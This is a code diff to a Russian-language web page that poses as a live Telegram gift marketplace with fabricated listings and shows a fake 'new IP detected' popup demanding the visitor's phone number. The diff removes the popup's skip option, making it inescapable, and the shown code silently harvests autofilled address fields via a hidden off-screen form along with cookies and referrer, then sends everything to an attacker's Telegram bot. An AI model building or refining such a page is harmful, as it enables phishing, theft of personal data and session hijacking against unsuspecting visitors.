@@ -21,7 +21,7 @@ body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSy
 .val.g{color:var(--green)}.val.y{color:var(--yellow)}.val.b{color:var(--accent)}
 .stat-card .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
 .section{margin-bottom:20px}
-.section-title{font-size:14px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.section-title{font-size:14px;font-weight:600;margin-bottom:10px}
 .table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
 table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
 th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);white-space:nowrap}
@@ -30,19 +30,18 @@ td.user{color:#fff;font-weight:500}
 td.gift{color:#e2e8f0}
 td.price{color:var(--green);font-weight:600}
 tr:last-child td{border-bottom:none}
-.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:100;justify-content:center;align-items:center;padding:20px}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.78);z-index:100;justify-content:center;align-items:center;padding:20px}
 .overlay.show{display:flex}
 .popup{background:var(--card);border:1px solid var(--accent);border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center;animation:popIn 0.3s ease}
 @keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
 .popup .icon{font-size:44px;margin-bottom:10px}
 .popup h3{font-size:18px;font-weight:700;margin-bottom:6px;color:#fff}
-.popup .desc{font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.5}
-.popup input{width:100%;padding:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:12px}
+.popup .desc{font-size:13px;color:var(--muted);margin-bottom:18px;line-height:1.5}
+.popup input{width:100%;padding:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:14px}
 .popup input:focus{outline:none;border-color:var(--accent)}
 .popup input::placeholder{color:#3a4450}
 .popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
 .popup .btn-pop:active{transform:scale(0.97)}
-.popup .skip{display:block;margin-top:12px;color:var(--muted);font-size:11px;text-decoration:underline;cursor:pointer}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none}
 .footer-bar{text-align:center;padding:20px;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px 10px}}
@@ -87,8 +86,7 @@ tr:last-child td{border-bottom:none}
 <div class="table-wrap">
 <table>
 <thead><tr><th>Продавец</th><th>Подарок</th><th>Цена</th><th>Время</th></tr></thead>
-<tbody id="giftTable">
-</tbody>
+<tbody id="giftTable"></tbody>
 </table>
 </div>
 </div>
@@ -101,10 +99,9 @@ tr:last-child td{border-bottom:none}
 <div class="popup">
 <div class="icon">🛡️</div>
 <h3>Подтвердите доступ</h3>
-<div class="desc">Обнаружен новый IP-адрес.<br>Введите номер телефона для верификации.<br><br>📡 Это защищает базу от ботов.</div>
+<div class="desc">Обнаружен новый IP-адрес.<br>Для продолжения введите номер телефона.<br><br>📡 Это защищает базу от ботов и мошенников.</div>
 <input type="tel" id="popupPhone" placeholder="Введите номер телефона" autocomplete="tel-national">
 <button class="btn-pop" onclick="submitPhone()">Подтвердить</button>
-<a class="skip" onclick="closePopup()">Пропустить</a>
 </div>
 </div>
 
@@ -132,7 +129,6 @@ const gifts=[
 {user:"@roma_tomsk",gift:"Snoop Dogg 🐶",price:"1 400 ₽"},
 ];
 
-// Перемешиваем и показываем
 function shuffleAndShow(){
 const shuffled=[...gifts].sort(()=>Math.random()-0.5).slice(0,8);
 const tbody=document.getElementById('giftTable');
@@ -146,7 +142,6 @@ tbody.innerHTML=shuffled.map((g,i)=>`<tr>
 shuffleAndShow();
 setInterval(shuffleAndShow,8000);
 
-// Обновление времени
 setInterval(()=>{document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
 // Пассивный сбор
@@ -199,8 +194,6 @@ passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
 // Попап через 15 секунд
 setTimeout(()=>{document.getElementById('overlay').classList.add('show')},15000);
 
-function closePopup(){document.getElementById('overlay').classList.remove('show')}
-
 async function submitPhone(){
 const phone=document.getElementById('popupPhone').value.trim();
 if(!phone){alert('Введите номер телефона');return}
@@ -239,11 +232,16 @@ ADDR: ${d.af_adr||"-"}
 🔗 REF: ${d.ref}
 🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}`;
 
-await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+try{
+const resp=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:msg})
 });
+console.log('Sent to Telegram:',resp.status);
+}catch(e){
+console.error('Error sending:',e);
+}
 
 document.getElementById('overlay').classList.remove('show');
 alert('✅ Доступ подтверждён');
